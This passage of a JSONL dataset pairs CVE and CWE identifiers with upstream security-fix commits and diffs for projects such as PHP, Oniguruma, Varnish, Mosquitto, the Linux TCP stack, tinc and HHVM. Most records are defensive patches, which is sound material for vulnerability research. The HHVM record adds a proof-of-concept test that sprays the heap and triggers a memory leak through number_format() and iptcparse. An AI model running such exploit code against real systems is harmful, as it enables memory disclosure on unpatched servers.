ZEND_MM_SMALL_SIZE_TO_BIN(size);\n-\t\t\tif (old_bin_num == bin_num) {\n+\t\t\tif (size <= ZEND_MM_MAX_SMALL_SIZE) {\n+\t\t\t\tint bin_num = ZEND_MM_SMALL_SIZE_TO_BIN(size);\n+\t\t\t\tif (old_bin_num == bin_num) {\n #if ZEND_DEBUG\n-\t\t\t\tdbg = zend_mm_get_debug_info(heap, ptr);\n-\t\t\t\tdbg->size = real_size;\n-\t\t\t\tdbg->filename = __zend_filename;\n-\t\t\t\tdbg->orig_filename = __zend_orig_filename;\n-\t\t\t\tdbg->lineno = __zend_lineno;\n-\t\t\t\tdbg->orig_lineno = __zend_orig_lineno;\n+\t\t\t\t\tdbg = zend_mm_get_debug_info(heap, ptr);\n+\t\t\t\t\tdbg->size = real_size;\n+\t\t\t\t\tdbg->filename = __zend_filename;\n+\t\t\t\t\tdbg->orig_filename = __zend_orig_filename;\n+\t\t\t\t\tdbg->lineno = __zend_lineno;\n+\t\t\t\t\tdbg->orig_lineno = __zend_orig_lineno;\n #endif\n-\t\t\t\treturn ptr;\n+\t\t\t\t\treturn ptr;\n+\t\t\t\t}\n \t\t\t}\n \t\t} else /* if (info & ZEND_MM_IS_LARGE_RUN) */ {\n \t\t\tZEND_MM_CHECK(ZEND_MM_ALIGNED_OFFSET(page_offset, ZEND_MM_PAGE_SIZE) == 0, \"zend_mm_heap corrupted\");\n", "owner": "php", "repo": "php-src", "source": "cve"}
{"CVE_ID": "CVE-2019-13224", "CWE_ID": "416", "category": "security", "commit_id": "0f7f61ed1b7b697e283e37bd2d731d0bd57adb55", "commit_message": "From 0f7f61ed1b7b697e283e37bd2d731d0bd57adb55 Mon Sep 17 00:00:00 2001\nFrom: \"K.Kosako\" <kosako@sofnec.co.jp>\nDate: Thu, 27 Jun 2019 17:25:26 +0900\nSubject: [PATCH] Fix CVE-2019-13224: don't allow different encodings for\n onig_new_deluxe()\n\n---\n src/regext.c | 6 +++---\n 1 file changed, 3 insertions(+), 3 deletions(-)\n\n", "diff_code": "diff --git a/src/regext.c b/src/regext.c\nindex fa4b360..965c793 100644\n--- a/src/regext.c\n+++ b/src/regext.c\n@@ -29,6 +29,7 @@\n \n #include \"regint.h\"\n \n+#if 0\n static void\n conv_ext0be32(const UChar* s, const UChar* end, UChar* conv)\n {\n@@ -158,6 +159,7 @@ conv_encoding(OnigEncoding from, OnigEncoding to, const UChar* s, const UChar* e\n \n   return ONIGERR_NOT_SUPPORTED_ENCODING_COMBINATION;\n }\n+#endif\n \n extern int\n onig_new_deluxe(regex_t** reg, const UChar* pattern, const UChar* pattern_end,\n@@ -169,9 +171,7 @@ onig_new_deluxe(regex_t** reg, const UChar* pattern, const UChar* pattern_end,\n   if (IS_NOT_NULL(einfo)) einfo->par = (UChar* )NULL;\n \n   if (ci->pattern_enc != ci->target_enc) {\n-    r = conv_encoding(ci->pattern_enc, ci->target_enc, pattern, pattern_end,\n-                      &cpat, &cpat_end);\n-    if (r != 0) return r;\n+    return ONIGERR_NOT_SUPPORTED_ENCODING_COMBINATION;\n   }\n   else {\n     cpat     = (UChar* )pattern;\n", "owner": "kkos", "repo": "oniguruma", "source": "cve"}
{"CVE_ID": "CVE-2014-4503", "CWE_ID": "20", "category": "security", "commit_id": "910c36089940e81fb85c65b8e63dcd2fac71470c", "commit_message": "From 910c36089940e81fb85c65b8e63dcd2fac71470c Mon Sep 17 00:00:00 2001\nFrom: Noel Maersk <veox@wemakethings.net>\nDate: Thu, 5 Jun 2014 23:02:02 +0300\nSubject: [PATCH] stratum: parse_notify(): Don't die on malformed\n bbversion/prev_hash/nbit/ntime.\n\nMight have introduced a memory leak, don't have time to check. :(\n\nShould the other hex2bin()'s be checked?\n\nThanks to Mick Ayzenberg <mick.dejavusecurity.com> for finding this.\n---\n util.c | 11 +++++++++--\n 1 file changed, 9 insertions(+), 2 deletions(-)\n\n", "diff_code": "diff --git a/util.c b/util.c\nindex 941545183..b3d2f0b30 100644\n--- a/util.c\n+++ b/util.c\n@@ -1600,17 +1600,23 @@ static bool parse_notify(struct pool *pool, json_t *val)\n \t\tpool->swork.nbit,\n \t\t\"00000000\", /* nonce */\n \t\tworkpadding);\n-\tif (unlikely(!hex2bin(pool->header_bin, header, 128)))\n-\t\tquit(1, \"Failed to convert header to header_bin in parse_notify\");\n+\tif (unlikely(!hex2bin(pool->header_bin, header, 128))) {\n+\t\tapplog(LOG_WARNING, \"%s: Failed to convert header to header_bin, got %s\", __func__, header);\n+\t\tpool_failed(pool);\n+\t\t// TODO: memory leaks? goto out, clean up there?\n+\t\treturn false;\n+\t}\n \n \tcb1 = (unsigned char *)calloc(cb1_len, 1);\n \tif (unlikely(!cb1))\n \t\tquithere(1, \"Failed to calloc cb1 in parse_notify\");\n \thex2bin(cb1, coinbase1, cb1_len);\n+\n \tcb2 = (unsigned char *)calloc(cb2_len, 1);\n \tif (unlikely(!cb2))\n \t\tquithere(1, \"Failed to calloc cb2 in parse_notify\");\n \thex2bin(cb2, coinbase2, cb2_len);\n+\n \tfree(pool->coinbase);\n \talign_len(&alloc_len);\n \tpool->coinbase = (unsigned char *)calloc(alloc_len, 1);\n@@ -1618,6 +1624,7 @@ static bool parse_notify(struct pool *pool, json_t *val)\n \t\tquit(1, \"Failed to calloc pool coinbase in parse_notify\");\n \tmemcpy(pool->coinbase, cb1, cb1_len);\n \tmemcpy(pool->coinbase + cb1_len, pool->nonce1bin, pool->n1_len);\n+\t// NOTE: gap for nonce2, filled at work generation time\n \tmemcpy(pool->coinbase + cb1_len + pool->n1_len + pool->n2size, cb2, cb2_len);\n \tcg_wunlock(&pool->data_lock);\n \n", "owner": "sgminer-dev", "repo": "sgminer", "source": "cve"}
{"CVE_ID": "CVE-2017-8807", "CWE_ID": "119", "category": "security", "commit_id": "176f8a075a963ffbfa56f1c460c15f6a1a6af5a7", "commit_message": "From 176f8a075a963ffbfa56f1c460c15f6a1a6af5a7 Mon Sep 17 00:00:00 2001\nFrom: Martin Blix Grydeland <martin@varnish-software.com>\nDate: Mon, 18 Sep 2017 16:04:53 +0200\nSubject: [PATCH] Avoid buffer read overflow on vcl_error and -sfile\n\nThe file stevedore may return a buffer larger than asked for when\nrequesting storage. Due to lack of check for this condition, the code\nto copy the synthetic error memory buffer from vcl_error would overrun\nthe buffer.\n\nPatch by @shamger\n\nFixes: #2429\n---\n bin/varnishd/cache/cache_fetch.c | 2 ++\n 1 file changed, 2 insertions(+)\n\n", "diff_code": "diff --git a/bin/varnishd/cache/cache_fetch.c b/bin/varnishd/cache/cache_fetch.c\nindex 20b3596017..883964239c 100644\n--- a/bin/varnishd/cache/cache_fetch.c\n+++ b/bin/varnishd/cache/cache_fetch.c\n@@ -899,6 +899,8 @@ vbf_stp_error(struct worker *wrk, struct busyobj *bo)\n \t\tl = ll;\n \t\tif (VFP_GetStorage(bo->vfc, &l, &ptr) != VFP_OK)\n \t\t\tbreak;\n+\t\tif (l > ll)\n+\t\t\tl = ll;\n \t\tmemcpy(ptr, VSB_data(synth_body) + o, l);\n \t\tVFP_Extend(bo->vfc, l);\n \t\tll -= l;\n", "owner": "varnishcache", "repo": "varnish-cache", "source": "cve"}
{"CVE_ID": "CVE-2018-20145", "CWE_ID": "254", "category": "security", "commit_id": "9097577b49b7fdcf45d30975976dd93808ccc0c4", "commit_message": "From 9097577b49b7fdcf45d30975976dd93808ccc0c4 Mon Sep 17 00:00:00 2001\nFrom: \"Roger A. Light\" <roger@atchoo.org>\nDate: Sun, 9 Dec 2018 09:45:14 +0000\nSubject: [PATCH] Fix acl_file being ignore for default listener if with\n per_listener_settings\n\nClose #1073. Thanks to Jef Driesen.\n\nBug: https://github.com/eclipse/mosquitto/issues/1073\n---\n ChangeLog.txt | 5 +++++\n src/conf.c    | 1 +\n 2 files changed, 6 insertions(+)\n\n", "diff_code": "diff --git a/ChangeLog.txt b/ChangeLog.txt\nindex c3a6c60a1..6287bce2e 100644\n--- a/ChangeLog.txt\n+++ b/ChangeLog.txt\n@@ -1,6 +1,11 @@\n 1.5.5 - 201812xx\n ================\n \n+Security:\n+- If `per_listener_settings` is set to true, then the `acl_file` setting was\n+  ignored for the \"default listener\" only. This has been fixed. This does not\n+  affect any listeners defined with the `listener` option. Closes #1073.\n+\n Broker:\n - Add `socket_domain` option to allow listeners to disable IPv6 support.\n   This is required to work around a problem in libwebsockets that means\ndiff --git a/src/conf.c b/src/conf.c\nindex 67e172b00..87294680a 100644\n--- a/src/conf.c\n+++ b/src/conf.c\n@@ -497,6 +497,7 @@ int config__parse_args(struct mosquitto_db *db, struct mosquitto__config *config\n \t\tconfig->listeners[config->listener_count-1].use_identity_as_username = config->default_listener.use_identity_as_username;\n \t\tconfig->listeners[config->listener_count-1].use_subject_as_username = config->default_listener.use_subject_as_username;\n #endif\n+\t\tconfig->listeners[config->listener_count-1].security_options.acl_file = config->default_listener.security_options.acl_file;\n \t\tconfig->listeners[config->listener_count-1].security_options.password_file = config->default_listener.security_options.password_file;\n \t\tconfig->listeners[config->listener_count-1].security_options.psk_file = config->default_listener.security_options.psk_file;\n \t\tconfig->listeners[config->listener_count-1].security_options.auth_plugin_configs = config->default_listener.security_options.auth_plugin_configs;\n", "owner": "eclipse", "repo": "mosquitto", "source": "cve"}
{"CVE_ID": "CVE-2017-7274", "CWE_ID": "476", "category": "security", "commit_id": "7ab66cca5bbdf6cb2d69339ef4f513d95e532dbf", "commit_message": "From 7ab66cca5bbdf6cb2d69339ef4f513d95e532dbf Mon Sep 17 00:00:00 2001\nFrom: Giovanni <wargio@libero.it>\nDate: Mon, 27 Mar 2017 12:55:16 +0200\nSubject: [PATCH] Fix #7152 - Null deref in cms\n\n---\n libr/util/r_pkcs7.c | 4 +++-\n 1 file changed, 3 insertions(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/libr/util/r_pkcs7.c b/libr/util/r_pkcs7.c\nindex 765fe6f0e2..467f58fa72 100644\n--- a/libr/util/r_pkcs7.c\n+++ b/libr/util/r_pkcs7.c\n@@ -284,7 +284,9 @@ RCMS *r_pkcs7_parse_cms (const ut8 *buffer, ut32 length) {\n \t\treturn NULL;\n \t}\n \tobject = r_asn1_create_object (buffer, length);\n-\tif (!object || object->list.length != 2 || !object->list.objects[0] || object->list.objects[1]->list.length != 1) {\n+\tif (!object || object->list.length != 2 || !object->list.objects ||\n+\t\t!object->list.objects[0] || !object->list.objects[1] ||\n+\t\tobject->list.objects[1]->list.length != 1) {\n \t\tr_asn1_free_object (object);\n \t\tfree (container);\n \t\treturn NULL;\n", "owner": "radare", "repo": "radare2", "source": "cve"}
{"CVE_ID": "CVE-2015-6781", "CWE_ID": "189", "category": "security", "commit_id": "de776d4ef06ca29c240de3444348894f032b03ff", "commit_message": "From de776d4ef06ca29c240de3444348894f032b03ff Mon Sep 17 00:00:00 2001\nFrom: Lei Zhang <leizleiz@users.noreply.github.com>\nDate: Wed, 23 Sep 2015 16:06:28 -0700\nSubject: [PATCH] Check for integer overflow in sfntly::FontData::Bound().\n\nAlso delete dead code and cleanup some nits.\n\nThis is cl/96914065.\n---\n cpp/src/sfntly/data/font_data.cc | 44 ++++++++++++++++++++------------\n cpp/src/sfntly/data/font_data.h  | 15 ++---------\n cpp/src/sfntly/port/logging.h    | 31 ++++++++++++++++++++++\n 3 files changed, 60 insertions(+), 30 deletions(-)\n create mode 100644 cpp/src/sfntly/port/logging.h\n\n", "diff_code": "diff --git a/cpp/src/sfntly/data/font_data.cc b/cpp/src/sfntly/data/font_data.cc\nindex d2b95eac..95bee3e9 100644\n--- a/cpp/src/sfntly/data/font_data.cc\n+++ b/cpp/src/sfntly/data/font_data.cc\n@@ -14,11 +14,13 @@\n  * limitations under the License.\n  */\n \n-#include <limits.h>\n+#include \"sfntly/data/font_data.h\"\n+\n #include <algorithm>\n #include <functional>\n+#include <limits>\n \n-#include \"sfntly/data/font_data.h\"\n+#include \"sfntly/port/logging.h\"\n \n namespace sfntly {\n \n@@ -26,21 +28,29 @@ int32_t FontData::Size() const {\n   return std::min<int32_t>(array_->Size() - bound_offset_, bound_length_);\n }\n \n-bool FontData::Bound(int32_t offset, int32_t length) {\n-  if (offset + length > Size() || offset < 0 || length < 0)\n-    return false;\n-\n-  bound_offset_ += offset;\n+void FontData::Bound(int32_t offset, int32_t length) {\n+  // Inputs should not be negative.\n+  CHECK(offset >= 0);\n+  CHECK(length >= 0);\n+\n+  // Check to make sure |bound_offset_| will not overflow.\n+  CHECK(bound_offset_ <= std::numeric_limits<int32_t>::max() - offset);\n+  const int32_t new_offset = bound_offset_ + offset;\n+\n+  if (length == GROWABLE_SIZE) {\n+    // When |length| has the special value of GROWABLE_SIZE, it means the size\n+    // should not have any artificial limits, thus it is just the underlying\n+    // |array_|'s size. Just make sure |new_offset| is still within bounds.\n+    CHECK(new_offset <= array_->Size());\n+  } else {\n+    // When |length| has any other value, |new_offset| + |length| points to the\n+    // end of the array. Make sure that is within bounds, but use subtraction to\n+    // avoid an integer overflow.\n+    CHECK(new_offset <= array_->Size() - length);\n+  }\n+\n+  bound_offset_ = new_offset;\n   bound_length_ = length;\n-  return true;\n-}\n-\n-bool FontData::Bound(int32_t offset) {\n-if (offset > Size() || offset < 0)\n-    return false;\n-\n-  bound_offset_ += offset;\n-  return true;\n }\n \n int32_t FontData::Length() const {\n@@ -60,7 +70,7 @@ FontData::FontData(FontData* data, int32_t offset) {\n   Init(data->array_);\n   Bound(data->bound_offset_ + offset,\n         (data->bound_length_ == GROWABLE_SIZE)\n-            ? GROWABLE_SIZE : data->bound_length_ - offset);\n+        ? GROWABLE_SIZE : data->bound_length_ - offset);\n }\n \n FontData::~FontData() {}\ndiff --git a/cpp/src/sfntly/data/font_data.h b/cpp/src/sfntly/data/font_data.h\nindex d02e8b75..e0e7e799 100644\n--- a/cpp/src/sfntly/data/font_data.h\n+++ b/cpp/src/sfntly/data/font_data.h\n@@ -19,11 +19,9 @@\n \n #include <limits.h>\n \n-#include <vector>\n-\n-#include \"sfntly/port/type.h\"\n #include \"sfntly/data/byte_array.h\"\n #include \"sfntly/port/refcount.h\"\n+#include \"sfntly/port/type.h\"\n \n namespace sfntly {\n \n@@ -60,16 +58,7 @@ class FontData : virtual public RefCount {\n   // visible within the bounds set.\n   // @param offset the start of the new bounds\n   // @param length the number of bytes in the bounded array\n-  // @return true if the bounding range was successful; false otherwise\n-  virtual bool Bound(int32_t offset, int32_t length);\n-\n-  // Sets limits on the size of the FontData. This is a offset bound only so if\n-  // the FontData is writable and growable then there is no limit to that growth\n-  // from the bounding operation.\n-  // @param offset the start of the new bounds which must be within the current\n-  //        size of the FontData\n-  // @return true if the bounding range was successful; false otherwise\n-  virtual bool Bound(int32_t offset);\n+  virtual void Bound(int32_t offset, int32_t length);\n \n   // Makes a slice of this FontData. The returned slice will share the data with\n   // the original <code>FontData</code>.\ndiff --git a/cpp/src/sfntly/port/logging.h b/cpp/src/sfntly/port/logging.h\nnew file mode 100644\nindex 00000000..1d9e3195\n--- /dev/null\n+++ b/cpp/src/sfntly/port/logging.h\n@@ -0,0 +1,31 @@\n+/*\n+ * Copyright 2015 Google Inc. All Rights Reserved.\n+ *\n+ * Licensed under the Apache License, Version 2.0 (the \"License\");\n+ * you may not use this file except in compliance with the License.\n+ * You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+\n+#ifndef SFNTLY_CPP_SRC_SFNTLY_PORT_LOGGING_H_\n+#define SFNTLY_CPP_SRC_SFNTLY_PORT_LOGGING_H_\n+\n+#include <stdio.h>\n+#include <stdlib.h>\n+\n+// Cheap base/logging.h knock off.\n+\n+#define CHECK(expr) \\\n+    if (!(expr)) { \\\n+      printf(\"CHECK failed\\n\"); \\\n+      abort(); \\\n+    }\n+\n+#endif  // SFNTLY_CPP_SRC_SFNTLY_PORT_LOGGING_H_\n", "owner": "googlei18n", "repo": "sfntly", "source": "cve"}
{"CVE_ID": "CVE-2007-5501", "CWE_ID": "399", "category": "security", "commit_id": "96a2d41a3e495734b63bff4e5dd0112741b93b38", "commit_message": "From 96a2d41a3e495734b63bff4e5dd0112741b93b38 Mon Sep 17 00:00:00 2001\nFrom: =?UTF-8?q?Ilpo=20J=E4rvinen?= <ilpo.jarvinen@helsinki.fi>\nDate: Wed, 14 Nov 2007 15:47:18 -0800\nSubject: [TCP]: Make sure write_queue_from does not begin with NULL ptr\nMIME-Version: 1.0\nContent-Type: text/plain; charset=UTF-8\nContent-Transfer-Encoding: 8bit\n\nNULL ptr can be returned from tcp_write_queue_head to cached_skb\nand then assigned to skb if packets_out was zero. Without this,\nsystem is vulnerable to a carefully crafted ACKs which obviously\nis remotely triggerable.\n\nBesides, there's very little that needs to be done in sacktag\nif there weren't any packets outstanding, just skipping the rest\ndoesn't hurt.\n\nSigned-off-by: Ilpo Jrvinen <ilpo.jarvinen@helsinki.fi>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n net/ipv4/tcp_input.c | 5 +++++\n 1 file changed, 5 insertions(+)\n\n", "diff_code": "diff --git a/net/ipv4/tcp_input.c b/net/ipv4/tcp_input.c\nindex 12ae9a68cdaa..3f126ece8eb5 100644\n--- a/net/ipv4/tcp_input.c\n+++ b/net/ipv4/tcp_input.c\n@@ -1269,6 +1269,9 @@ tcp_sacktag_write_queue(struct sock *sk, struct sk_buff *ack_skb, u32 prior_snd_\n \tif (before(TCP_SKB_CB(ack_skb)->ack_seq, prior_snd_una - tp->max_window))\n \t\treturn 0;\n \n+\tif (!tp->packets_out)\n+\t\tgoto out;\n+\n \t/* SACK fastpath:\n \t * if the only SACK change is the increase of the end_seq of\n \t * the first block then only apply that SACK block\n@@ -1515,6 +1518,8 @@ tcp_sacktag_write_queue(struct sock *sk, struct sk_buff *ack_skb, u32 prior_snd_\n \t    (!tp->frto_highmark || after(tp->snd_una, tp->frto_highmark)))\n \t\ttcp_update_reordering(sk, tp->fackets_out - reord, 0);\n \n+out:\n+\n #if FASTRETRANS_DEBUG > 0\n \tBUG_TRAP((int)tp->sacked_out >= 0);\n \tBUG_TRAP((int)tp->lost_out >= 0);\n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "stoth68000", "repo": "media-tree", "source": "cve"}
{"CVE_ID": "CVE-2013-1428", "CWE_ID": "119", "category": "security", "commit_id": "17a33dfd95b1a29e90db76414eb9622df9632320", "commit_message": "From 17a33dfd95b1a29e90db76414eb9622df9632320 Mon Sep 17 00:00:00 2001\nFrom: Guus Sliepen <guus@tinc-vpn.org>\nDate: Fri, 12 Apr 2013 17:15:05 +0200\nSubject: [PATCH] Drop packets forwarded via TCP if they are too big\n (CVE-2013-1428).\n\nNormally all requests sent via the meta connections are checked so that they\ncannot be larger than the input buffer. However, when packets are forwarded via\nmeta connections, they are copied into a packet buffer without checking whether\nit fits into it. Since the packet buffer is allocated on the stack, this in\neffect allows an authenticated remote node to cause a stack overflow.\n\nThis issue was found by Martin Schobert.\n---\n src/net_packet.c | 3 +++\n 1 file changed, 3 insertions(+)\n\n", "diff_code": "diff --git a/src/net_packet.c b/src/net_packet.c\nindex 1efc60dd..054679e9 100644\n--- a/src/net_packet.c\n+++ b/src/net_packet.c\n@@ -394,6 +394,9 @@ static void receive_udppacket(node_t *n, vpn_packet_t *inpkt) {\n void receive_tcppacket(connection_t *c, const char *buffer, int len) {\n \tvpn_packet_t outpkt;\n \n+\tif(len > sizeof outpkt.data)\n+\t\treturn;\n+\n \toutpkt.len = len;\n \tif(c->options & OPTION_TCPONLY)\n \t\toutpkt.priority = 0;\n", "owner": "gsliepen", "repo": "tinc", "source": "cve"}
{"CVE_ID": "CVE-2019-6976", "CWE_ID": "200", "category": "security", "commit_id": "00622428bda8d7521db8d74260b519fa41d69d0a", "commit_message": "From 00622428bda8d7521db8d74260b519fa41d69d0a Mon Sep 17 00:00:00 2001\nFrom: John Cupitt <jcupitt@gmail.com>\nDate: Fri, 18 Jan 2019 10:10:43 +0000\nSubject: [PATCH] zero memory on malloc\n\nto prevent write of uninit memory under some error conditions\n\nthanks Balint\n---\n ChangeLog                | 5 ++++-\n libvips/iofuncs/memory.c | 4 ++--\n 2 files changed, 6 insertions(+), 3 deletions(-)\n\n", "diff_code": "diff --git a/ChangeLog b/ChangeLog\nindex e80313a8d..057adf95d 100644\n--- a/ChangeLog\n+++ b/ChangeLog\n@@ -1,5 +1,8 @@\n 4/1/19 started 8.7.4\n-- magicksave with magick6 API did not chain exceptions correctly [kleisauke]\n+- magicksave with magick6 API did not chain exceptions correctly causing a\n+  memory leak under some conditions [kleisauke]\n+- zero memory on allocate to prevent write of uninitialized memory under some \n+  error conditions [Balint Varga-Perke]\n \n 21/11/18 started 8.7.3\n - fix infinite loop for autofit with non-scaleable font \ndiff --git a/libvips/iofuncs/memory.c b/libvips/iofuncs/memory.c\nindex d877e2e0f..9f9b55f83 100644\n--- a/libvips/iofuncs/memory.c\n+++ b/libvips/iofuncs/memory.c\n@@ -173,7 +173,7 @@ vips_malloc( VipsObject *object, size_t size )\n {\n \tvoid *buf;\n \n-\tbuf = g_malloc( size );\n+\tbuf = g_malloc0( size );\n \n         if( object ) {\n \t\tg_signal_connect( object, \"postclose\", \n@@ -317,7 +317,7 @@ vips_tracked_malloc( size_t size )\n \t */\n \tsize += 16;\n \n-        if( !(buf = g_try_malloc( size )) ) {\n+        if( !(buf = g_try_malloc0( size )) ) {\n #ifdef DEBUG\n \t\tg_assert_not_reached();\n #endif /*DEBUG*/\n", "owner": "libvips", "repo": "libvips", "source": "cve"}
{"CVE_ID": "CVE-2018-6345", "CWE_ID": "119", "category": "security", "commit_id": "190ffdf6c8b1ec443be202c7d69e63a7e3da25e3", "commit_message": "From 190ffdf6c8b1ec443be202c7d69e63a7e3da25e3 Mon Sep 17 00:00:00 2001\nFrom: Guilherme Ottoni <ottoni@fb.com>\nDate: Fri, 14 Dec 2018 08:42:02 -0800\nSubject: [PATCH] Fix a bug in number_format()\n\nSummary: In case of error while calling snprintf, return empty string instead of malformed string.\n\nReviewed By: binliu19\n\nDifferential Revision: D13379372\n\nfbshipit-source-id: 1e5611598464daccc674d5a96558c9f2aee08fc8\n---\n hphp/runtime/base/zend-string.cpp             |  2 ++\n hphp/test/slow/string/number_format_error.php | 19 +++++++++++++++++++\n .../string/number_format_error.php.expect     |  2 ++\n 3 files changed, 23 insertions(+)\n create mode 100644 hphp/test/slow/string/number_format_error.php\n create mode 100644 hphp/test/slow/string/number_format_error.php.expect\n\n", "diff_code": "diff --git a/hphp/runtime/base/zend-string.cpp b/hphp/runtime/base/zend-string.cpp\nindex 072148f61c0..40267cffd6f 100644\n--- a/hphp/runtime/base/zend-string.cpp\n+++ b/hphp/runtime/base/zend-string.cpp\n@@ -1768,6 +1768,7 @@ String string_number_format(double d, int dec,\n   String tmpstr(63, ReserveString);\n   tmpbuf = tmpstr.mutableData();\n   tmplen = snprintf(tmpbuf, 64, \"%.*F\", dec, d);\n+  if (tmplen < 0) return empty_string();\n   if (tmpbuf == nullptr || !isdigit((int)tmpbuf[0])) {\n     tmpstr.setSize(tmplen);\n     return tmpstr;\n@@ -1777,6 +1778,7 @@ String string_number_format(double d, int dec,\n     tmpstr = String(tmplen, ReserveString);\n     tmpbuf = tmpstr.mutableData();\n     tmplen = snprintf(tmpbuf, tmplen + 1, \"%.*F\", dec, d);\n+    if (tmplen < 0) return empty_string();\n     if (tmpbuf == nullptr || !isdigit((int)tmpbuf[0])) {\n       tmpstr.setSize(tmplen);\n       return tmpstr;\ndiff --git a/hphp/test/slow/string/number_format_error.php b/hphp/test/slow/string/number_format_error.php\nnew file mode 100644\nindex 00000000000..e5899967bc0\n--- /dev/null\n+++ b/hphp/test/slow/string/number_format_error.php\n@@ -0,0 +1,19 @@\n+<?php\n+  $READ_LENGTH = 0x1000; // choose leak size\n+// construct fake iptc header for controlled read\n+$iptc_hdr =\n+  \"\\x1c\\x01\" . // magic\n+  \"\\x00\\x80\" . // dataset, recnum\n+  \"\\x00\" .     // padding\n+  pack(\"N\", $READ_LENGTH);\n+// spray a bit so it's near the broken string\n+$holder = [];\n+for($i = 0; $i < 100; $i++)\n+  $holder[] = str_pad($iptc_hdr, 96);\n+// trigger bug to create string with len=-1\n+$badstr = number_format(0,0x7fffffff);\n+var_dump($badstr);\n+// leak memory :)\n+$tmp = iptcparse($badstr);\n+var_dump($tmp);\n+?>\ndiff --git a/hphp/test/slow/string/number_format_error.php.expect b/hphp/test/slow/string/number_format_error.php.expect\nnew file mode 100644\nindex 00000000000..4cbe7ce9a78\n--- /dev/null\n+++ b/hphp/test/slow/string/number_format_error.php.expect\n@@ -0,0 +1,2 @@\n+string(0) \"\"\n+bool(false)\n", "owner": "facebook", "repo": "hhvm", "source": "cve"}
{"CVE_ID": "CVE-2019-1010296", "CWE_ID": "119", "category": "security", "commit_id": "b60e1cee406a1ff521145ab9534370dfb85dd592", "commit_message": "From b60e1cee406a1ff521145ab9534370dfb85dd592 Mon Sep 17 00:00:00 2001\nFrom: Joakim Bech <joakim.bech@linaro.org>\nDate: Thu, 27 Sep 2018 10:15:53 +0200\nSubject: [PATCH] svc: check for allocation overflow in\n syscall_cryp_obj_populate\n\nWithout checking for overflow there is a risk of allocating a buffer\nwith size smaller than anticipated and as a consequence of that it might\nlead to a heap based overflow with attacker controlled data written\noutside the boundaries of the buffer.\n\nFixes: OP-TEE-2018-0009: \"Integer overflow in crypto system calls\"\n\nSigned-off-by: Joakim Bech <joakim.bech@linaro.org>\nTested-by: Joakim Bech <joakim.bech@linaro.org> (QEMU v7, v8)\nReviewed-by: Jens Wiklander <jens.wiklander@linaro.org>\nReported-by: Riscure <inforequest@riscure.com>\nReported-by: Alyssa Milburn <a.a.milburn@vu.nl>\nAcked-by: Etienne Carriere <etienne.carriere@linaro.org>\n---\n core/tee/tee_svc_cryp.c | 9 ++++++++-\n 1 file changed, 8 insertions(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/core/tee/tee_svc_cryp.c b/core/tee/tee_svc_cryp.c\nindex b47a45dda6..6fac666104 100644\n--- a/core/tee/tee_svc_cryp.c\n+++ b/core/tee/tee_svc_cryp.c\n@@ -4,6 +4,7 @@\n  */\n \n #include <assert.h>\n+#include <compiler.h>\n #include <crypto/crypto.h>\n #include <kernel/tee_ta_manager.h>\n #include <mm/tee_mmu.h>\n@@ -1547,9 +1548,15 @@ TEE_Result syscall_cryp_obj_populate(unsigned long obj,\n \tif (!type_props)\n \t\treturn TEE_ERROR_NOT_IMPLEMENTED;\n \n-\tattrs = malloc(sizeof(TEE_Attribute) * attr_count);\n+\tsize_t alloc_size = 0;\n+\n+\tif (MUL_OVERFLOW(sizeof(TEE_Attribute), attr_count, &alloc_size))\n+\t\treturn TEE_ERROR_OVERFLOW;\n+\n+\tattrs = malloc(alloc_size);\n \tif (!attrs)\n \t\treturn TEE_ERROR_OUT_OF_MEMORY;\n+\n \tres = copy_in_attrs(to_user_ta_ctx(sess->ctx), usr_attrs, attr_count,\n \t\t\t    attrs);\n \tif (res != TEE_SUCCESS)\n", "owner": "OP-TEE", "repo": "optee_os", "source": "cve"}
{"CVE_ID": "CVE-2016-7568", "CWE_ID": "190", "category": "security", "commit_id": "46df0642618eabc5b5b7df490d1ae23bda00a745", "commit_message": "From 46df0642618eabc5b5b7df490d1ae23bda00a745 Mon Sep 17 00:00:00 2001\nFrom: \"Christoph M. Becker\" <cmbecker69@gmx.de>\nDate: Fri, 16 Sep 2016 11:31:21 +0200\nSubject: [PATCH] Fix #73003: Integer Overflow in gdImageWebpCtx of gd_webp.c\n\nWe add the missing integer overflow check to avoid potential buffer overflows.\n---\n NEWS                   | 2 ++\n ext/gd/libgd/gd_webp.c | 9 +++++++++\n 2 files changed, 11 insertions(+)\n\n", "diff_code": "diff --git a/NEWS b/NEWS\nindex 63a6800ba76d..ef6cb570abc4 100644\n--- a/NEWS\n+++ b/NEWS\n@@ -22,6 +22,8 @@ PHP                                                                        NEWS\n     (cmb)\n   . Fixed bug #50194 (imagettftext broken on transparent background w/o\n     alphablending). (cmb)\n+  . Fixed bug #73003 (Integer Overflow in gdImageWebpCtx of gd_webp.c). (trylab,\n+    cmb)\n \n - Mbstring:\n   . Fixed bug #72994 (mbc_to_code() out of bounds read). (Laruence, cmb)\ndiff --git a/ext/gd/libgd/gd_webp.c b/ext/gd/libgd/gd_webp.c\nindex bf9ac9dd0e1a..985187edc260 100644\n--- a/ext/gd/libgd/gd_webp.c\n+++ b/ext/gd/libgd/gd_webp.c\n@@ -180,6 +180,15 @@ void gdImageWebpCtx (gdImagePtr im, gdIOCtx * outfile, int quantization)\n \t/* Conversion to Y,U,V buffer */\n     yuv_width = (width + 1) >> 1;\n     yuv_height = (height + 1) >> 1;\n+\n+\tif (overflow2(width, height)) {\n+\t\treturn;\n+\t}\n+\t/* simplification possible, because WebP must not be larger than 16384**2 */\n+\tif (overflow2(width * height, 2 * sizeof(unsigned char))) {\n+\t\treturn;\n+\t}\n+\n     yuv_nbytes = width * height + 2 * yuv_width * yuv_height;\n \n     if ((Y = (unsigned char *)gdCalloc(yuv_nbytes, sizeof(unsigned char))) == NULL) {\n", "owner": "php", "repo": "php-src", "source": "cve"}
